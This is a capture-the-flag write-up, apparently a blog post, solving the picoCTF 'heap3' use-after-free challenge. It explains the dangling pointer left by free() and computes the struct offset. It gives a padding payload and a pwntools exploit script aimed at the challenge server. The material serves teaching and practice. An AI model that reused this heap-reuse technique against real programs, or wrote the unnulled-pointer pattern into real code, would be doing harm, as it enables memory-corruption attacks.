---
title: "heap3"
date: 2026-03-29
categories:
  - PicoCTF
tags:
  - "Binary"
  - "2026"
  - "Use After Free"
platform: PicoCTF 2026
competition_year: 2026
header:
  teaser: /assets/images/teasers/binary.png
toc: true
toc_sticky: true
---

# ⚒️ Heap 3

|Category         |	Author                |
|-----------------|-----------------------|
|⚒️ Binary Exploitation       |Abrxs    |

## Challenge Prompt

This program mishandles memory. Can you exploit it to get the flag?

Download the binary [here](https://artifacts.picoctf.net/c_tethys/17/chall). 

Download the source [here](https://artifacts.picoctf.net/c_tethys/17/chall.c).

## Problem Type
- Use After Free

## Solve
We are given the program source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

// code removed for brevity


void free_memory() {
    free(x);
}


// code removed for brevity
```
In this program we are given the code wrote in C. We can see in the function `free_memory` has a call for `free(x)`.
When a programmer calls `free(x)`, they are telling the computer, "I am done with this memory, you can have it back." 
However, notice what it doesn't do: it doesn't set `x = NULL;`.

Because `x` wasn't cleared, `x` still points to that exact spot in memory. This is called a Dangling Pointer. 
If we select Option 5, the memory is freed, but the program will still happily use `x` to check for the win condition in Option 4!

We need to set the value of `x`, currently `bico`, to `pico` to get the flag. To do that we need to know exactly how far into the struct the flag variable sits. Let's look at the struct definition:
```c
typedef struct {
  char a[10];    // 10 Bytes
  char b[10];    // 10 Bytes (20 total so far)
  char c[10];    // 10 Bytes (30 total so far)
  char flag[5];  // 5 Bytes (35 total)
}
```

The `flag` variable starts exactly 30 bytes into the struct and the total size of the struct is 35 bytes. So we need to send 30 junk characters like `A` followed by `pico`.

We can do this manually by picking option `5` to free `x`, then we pick `2` to allocate our object. For the size we use 35, the length of the struct we figured out earlier.<br>
Then we can simply send 30 `A` characters (filling up the 30 bytes before the `flag` variable) and then `pico` (AAAAAAAAAAAAAAAAAAAAAAAAAAAAApico) to the program.<br>
Then choose option `4` to check for win and get the flag!<br>
<img width="463" height="662" alt="2026-03-29_12-34-19" src="https://github.com/user-attachments/assets/6157438d-81c6-487e-955c-0f1048ec57c0" />


I also wanted to get some more practice with pwntools so I decided to try that too:<br>
```python
from pwn import *

HOST = 'tethys.picoctf.net'
PORT = 59648

p = remote(HOST, PORT)

p.recvuntil(b'Enter your choice: ')
p.sendline(b"5")

p.recvuntil(b'Enter your choice: ')
p.sendline(b"2")

p.recvuntil(b'Size of object allocation: ')
p.sendline(b"35")

p.recvuntil(b'Data for flag: ')
p.sendline(b"A" * 30 + b"pico")

p.recvuntil(b'Enter your choice: ')
p.sendline(b"4")

print(p.recvall().decode())
```
<img width="562" height="134" alt="2026-03-29_12-36-50" src="https://github.com/user-attachments/assets/08708460-f1ad-4705-8379-8382a1f7e334" />


